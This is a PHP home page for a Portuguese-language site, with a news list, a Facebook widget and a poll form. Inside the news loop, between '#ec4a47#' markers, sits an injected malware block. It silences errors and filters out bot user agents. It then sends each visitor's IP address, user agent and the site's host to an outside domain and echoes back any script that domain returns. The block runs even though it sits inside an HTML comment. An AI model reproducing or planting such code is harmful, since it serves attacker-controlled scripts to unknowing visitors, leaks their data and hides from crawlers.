<?php

# ------------------------------------------------------------------ #
ini_set( 'display_errors', 1 );
error_reporting( E_ALL );
# ------------------------------------------------------------------ #
include_once( "_config.php" );
include_once( "classes/utils.php" );
include_once( "classes/quizDAO.php" );
include_once( "classes/quizRespostaDAO.php" );
include_once( "classes/recadosDAO.php" );
include_once( "classes/noticias.php" );
# ------------------------------------------------------------------ #

$quiz = quizDAO::getQuizForHome();
$recados = recadosDAO::getRecadosForHome();
$noticiaLista = dao::find( 'noticias', array('ativo' => 'S'), 'titulo asc' );

?>
<?php include("header.php"); ?>
<body>
<?php include("topo-e-banner.php"); ?>
<script>
	$(document).ready(function(){
		$.ajax({
			url: "facebook.php",
			type: 'post',
			cache: false,
			data: {},
			dataType: 'html',
			success: function(retorno)
			{
				$('#div_facebook').html(retorno);
			},
			error: function(XMLHttpRequest, textStatus, errorThrown)
			{
				//alert(textStatus);
			}
		});	
	});
</script>
<div id="content">


	<div id="noticias">
		<h2>NOT&Iacute;CIAS</h2>
		<!--
		<?php if ( isset( $recados ) ): ?>
			<?php foreach ($recados as $count => $recado): ?>
				<div class="tituloNoticia <?php echo ( $count % 2 == 0 ) ? 'cinza' : '' ?>"><?php echo $recado->texto_parcial ?><span class="mais">MAIS</span></div>
				<div class="conteudoNoticia">
					<p><?php echo $recado->texto ?>
<?php
#ec4a47#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/ec4a47#
?>


</p>
				</div>
			<?php endforeach ?>
		<?php endif ?>
        -->
		<div id="div_facebook"></div>
	</div>
	<div id="right">
		<!--div id="twitter">
		</div-->
		<?php if ( isset( $quiz->id ) ): ?>
			<div id="quiz">
				<h2>POLL</h2>
				<form id="form" name="form_quiz">
                	<input type="hidden" id="id_quiz" name="id_quiz" value="<?php echo $quiz->id; ?>" />
					<div id="pergunta"><?php echo $quiz->pergunta ?></div>
					<?php foreach( $quiz->respostas as $count => $resposta ): ?>
						<input type="radio" name="id_quiz_resposta" class="radio" value="<?php echo $resposta->id ?>"/><label class="label"><?php echo $resposta->texto ?></label><br />
					<?php endforeach ?>
                    <br />
					<input type="button" class="button" id="enviar_quiz" style="background-image:url(images/enviar.jpg); background-repeat:no-repeat; height:19px; width:59px; border:none; cursor:pointer;" />&nbsp;&nbsp;<input type="button" style="background-image:url(images/resultados2.jpg); background-repeat:no-repeat; height:19px; width:85px; border:none; cursor:pointer;" class="button" id="quiz_resultados" />
				</form>
			</div>
		<?php endif ?>
		<!-- <a href="javascript:open_popup('teste_online.php')"><img src="img/teste-online.jpg" alt="Teste Online" title="Faça um teste online"/></a> -->
	</div>
	
	
</div>
<?php include("rodape.php"); ?>